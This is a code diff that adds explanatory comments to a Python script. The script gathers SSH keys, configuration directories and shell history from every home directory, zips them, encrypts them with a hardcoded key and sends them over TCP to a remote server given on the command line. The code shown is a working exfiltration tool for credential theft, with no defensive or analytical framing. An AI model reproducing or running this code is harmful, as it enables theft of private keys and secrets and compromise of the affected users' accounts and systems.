@@ -33,6 +33,7 @@ parser.add_argument('port', type=port, nargs=1, help='Specfies server port')
 
 args=parser.parse_args()
 
+# List of regular expression patterns to search for
 desired_extensions = [
     r".*/\.ssh/?",
     r".*/\.config/?",
@@ -45,23 +46,32 @@ desired_extensions = [
 
 
 def get_files():
+	# Stores lists of path prefixes that should be zipped
 	paths_to_copy = []
+	# List of files that match the path prefixes above and should be zipped
 	files_to_zip = []
-	
+		
+	# Walk through all subdirectories and files in /home directory
 	for curr_dir, subdirs, files in os.walk("/home", followlinks=False):
+		# Check if current directory matches any desired file/directory names
 		for pattern in desired_extensions:
 			if re.fullmatch(pattern, curr_dir):
+				# Add directory path to path prefixes on match
 				paths_to_copy.append(curr_dir)
 				break
 		copy_dir = False
 		for path in paths_to_copy:
+			# Copy all files in directory if directory path in path prefixes
 			if curr_dir.startswith(path):
 				copy_dir = True
+		# Iterate through list of files in current directory
 		for fname in files:
 			file_path = os.path.join(curr_dir, fname)
+			# Copy all files in directory if directory path in path prefixes
 			if copy_dir:
 				files_to_zip.append(file_path)
 				continue
+			# Check if file matches any desired file names, i.e. shell history files, if not copying directory
 			for pattern in desired_extensions:
 				if re.fullmatch(pattern, file_path):
 					files_to_zip.append(file_path)
@@ -69,13 +79,17 @@ def get_files():
 	return files_to_zip
 	
 def zip_files(file_paths):
+	# Create in-memory buffer for ZIP file
 	buffer = io.BytesIO()
 	with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
 		for file_path in file_paths:
+			# Add each respective desired file to the ZIP while maintaining its relative path from /home. Direcotires created automatically.
 			archive_path = os.path.relpath(file_path, "/home")
 			zf.write(file_path, archive_path)
+	# Return ZIP in bytes
 	return buffer
 
+# Create TCP socket and send encoded data to server
 def send_data(server_ip, server_port, encoded_msg):
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	sock.connect((server_ip, server_port))
@@ -84,6 +98,7 @@ def send_data(server_ip, server_port, encoded_msg):
 files_to_zip = get_files()
 zf_bytes = zip_files(files_to_zip)
 
+# Shared key to encrypt ZIP file before sending
 key = b'rfxRvXZ1FTB8XdCew9-BwGnb65iCiXGGo6TzH67KfZg='
 fernet = Fernet(key)
 
